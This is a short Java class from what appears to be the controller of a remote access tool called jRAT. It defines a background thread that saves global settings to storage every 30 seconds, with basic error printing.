package io.jrat.controller.threads;

import io.jrat.controller.settings.AbstractStorable;
import io.jrat.controller.settings.Settings;

public class ThreadSaveCycle extends Thread {

    public ThreadSaveCycle() {
        super("Save Cycle");
    }

    public void run() {
        while (true) {
            AbstractStorable.saveAllGlobals();

            try {
                Settings.getGlobal().save();
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Thread.sleep(30 * 1000);
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
    }

}
